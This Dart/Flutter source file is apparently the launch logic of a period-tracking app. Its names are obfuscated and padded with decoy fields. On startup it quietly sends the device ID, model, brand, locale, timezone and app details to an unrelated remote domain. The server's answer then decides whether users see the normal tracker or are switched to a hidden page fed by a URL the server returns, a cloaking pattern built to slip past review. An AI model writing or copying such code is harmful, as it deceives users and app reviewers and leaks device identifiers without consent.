import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';

void statusCheck() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/uninit");
  }
}

class PageLogic extends GetxController {


  var bgitae = RxBool(false);
  var seitokq = RxBool(true);
  var wkpc = RxString("");
  var jana = RxBool(false);
  var mills = RxBool(true);
  final smbvdzu = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    statusCheck();
    super.onInit();
    icbrtvpj();
  }


  Future<void> icbrtvpj() async {

    jana.value = true;
    mills.value = true;
    seitokq.value = false;

    smbvdzu.post("https://night.soberonto.online/bqdkpugeamojcyfwhvnxslzrt",data: await ghcawont()).then((value) {
      var awohps = value.data["awohps"] as String;
      var sxpectgu = value.data["sxpectgu"] as bool;
      if (sxpectgu) {
        wkpc.value = awohps;
        chelsey();
      } else {
        stanton();
      }
    }).catchError((e) {
      seitokq.value = true;
      mills.value = true;
      jana.value = false;
    });
  }

  Future<Map<String, dynamic>> ghcawont() async {
    final DeviceInfoPlugin jstl = DeviceInfoPlugin();
    PackageInfo bimwrn_fqykg = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var xnjfc = Platform.localeName;
    var tbyen = currentTimeZone;

    var unkirpfm = bimwrn_fqykg.packageName;
    var epksryh = bimwrn_fqykg.version;
    var iwsrt = bimwrn_fqykg.buildNumber;

    var aogd = bimwrn_fqykg.appName;
    var kaylinZboncak = "";
    var bdlhrin  = "";
    var larhpjdi = "";
    var mireilleAnkunding = "";
    var darrylBecker = "";
    var kaitlynBailey = "";
    var vesuxifp = "";
    var michaelaGaylord = "";
    var augustineKautzer = "";
    var mckaylaWeissnat = "";


    var lxoyhuj = "";
    var demarcoBalistreri = "";
    var jsxvikzp = false;

    if (GetPlatform.isAndroid) {
      lxoyhuj = "android";
      var dlcmkvb = await jstl.androidInfo;

      larhpjdi = dlcmkvb.brand;

      vesuxifp  = dlcmkvb.model;
      bdlhrin = dlcmkvb.id;

      jsxvikzp = dlcmkvb.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lxoyhuj = "ios";
      var vobtni = await jstl.iosInfo;
      larhpjdi = vobtni.name;
      vesuxifp = vobtni.model;

      bdlhrin = vobtni.identifierForVendor ?? "";
      jsxvikzp  = vobtni.isPhysicalDevice;
    }
    var res = {
      "aogd": aogd,
      "unkirpfm": unkirpfm,
      "mckaylaWeissnat" : mckaylaWeissnat,
      "vesuxifp": vesuxifp,
      "tbyen": tbyen,
      "demarcoBalistreri" : demarcoBalistreri,
      "larhpjdi": larhpjdi,
      "kaitlynBailey" : kaitlynBailey,
      "bdlhrin": bdlhrin,
      "xnjfc": xnjfc,
      "lxoyhuj": lxoyhuj,
      "jsxvikzp": jsxvikzp,
      "mireilleAnkunding" : mireilleAnkunding,
      "epksryh": epksryh,
      "darrylBecker" : darrylBecker,
      "michaelaGaylord" : michaelaGaylord,
      "iwsrt": iwsrt,
      "augustineKautzer" : augustineKautzer,
      "kaylinZboncak" : kaylinZboncak,

    };
    return res;
  }

  Future<void> stanton() async {
    final SharedPreferences prefs = await SharedPreferences.getInstance();
    List<String> select = prefs.getStringList('menstrualSelect') ?? [];
    bool selectBool = select.isNotEmpty;
    Get.offAllNamed( selectBool ? '/tab' : '/birthday');
  }

  Future<void> chelsey() async {
    Get.offAllNamed("/guess");
  }

}
